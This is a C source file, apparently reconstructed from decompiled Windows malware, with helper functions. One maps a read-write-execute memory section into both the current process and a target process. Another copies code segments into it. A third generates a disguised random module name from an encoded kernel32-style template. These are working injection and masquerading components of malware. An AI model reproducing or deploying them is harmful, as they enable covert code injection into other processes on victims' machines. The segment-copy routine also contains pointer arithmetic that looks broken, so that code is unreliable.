/******************************************************************************************
  Copyright 2012-2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "5. Utils.h"

// 100% (C) CODE MATCH
INT32 SharedMapViewOfSection(HANDLE hHandle, SIZE_T iSectionSize, PHANDLE pSectionHandle, PVOID *pBaseAddr1, PVOID *pBaseAddr2)
{
	SIZE_T iViewSize; // [sp+0h] [bp-10h]@1
	NTSTATUS iStatus; // [sp+4h] [bp-Ch]@3
	LARGE_INTEGER liMaximumSize; // [sp+8h] [bp-8h]@1

	iViewSize = iSectionSize;
	
	liMaximumSize.LowPart  = iSectionSize;
	liMaximumSize.HighPart = 0;
	
	if(STATUS_SUCCESS != g_hardAddrs.ZwCreateSection(pSectionHandle, SECTION_ALL_ACCESS, 0, &liMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0))// (..., 0xF001F, 0, ..., 64, 0x8000000, 0)
		return -5;
	
	iStatus = g_hardAddrs.ZwMapViewOfSection(*pSectionHandle, GetCurrentProcess(), pBaseAddr1, 0, 0, 0, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	if(iStatus != STATUS_SUCCESS) return -5;
	
	iStatus = g_hardAddrs.ZwMapViewOfSection(*pSectionHandle, hHandle            , pBaseAddr2, 0, 0, 0, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	if(iStatus != STATUS_SUCCESS) return -5;
	
	return 0;
}

// 99% (C) CODE MATCH
void CopySegmentIntoSections(PVOID *pSharedSection1, PVOID pSharedSection2, INT32 *pSectionPointer, PSECTION_SEGEMENT_INFO sSegment, PVOID pSegmentContent, UINT32 iSegmentSize)
{
	if(iSegmentSize) __memcpy(*pSharedSection1, pSegmentContent, iSegmentSize);

	sSegment->SegmentAddress = (DWORD)pSharedSection2 + *pSectionPointer;
	sSegment->SegmentSize = iSegmentSize;
	
	*pSharedSection1  = pSharedSection1 + iSegmentSize;
	*pSectionPointer += iSegmentSize;
}

// 100% (C) CODE MATCH
INT32 GetRandomModuleName(GENERAL_INFO_BLOCK *sInfoBlock, LPCWSTR szDebugLibraryName)
{
	WCHAR __KERNEL32_DLL_ASLR_08x[42]; // [sp+8h] [bp-58h]@5
	DWORD dwRandom; // [sp+5Ch] [bp-4h]@5

	if(szDebugLibraryName)
	{
		if(lstrlenW(szDebugLibraryName) >= 31) return -1;
		lstrcpyW(sInfoBlock->RandomLibraryName, szDebugLibraryName);
	}
	else
	{
		dwRandom = GetTickCount() + 3 * GetCurrentThreadId();
		DecodeModuleNameW((WCHAR *)ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);
		
		do
			wsprintfW(sInfoBlock->RandomLibraryName, __KERNEL32_DLL_ASLR_08x, dwRandom++);
		while(GetModuleHandleW(sInfoBlock->RandomLibraryName));
	}
	
	sInfoBlock->OriginalAddress = XADDR_KEY ^ (UINT32)sInfoBlock;
	sInfoBlock->UnknownZero0 = 0;
	sInfoBlock->AlignAddressesFunction = (DWORD)BLOCK4_AlignAddresses;
	
	return 0;
}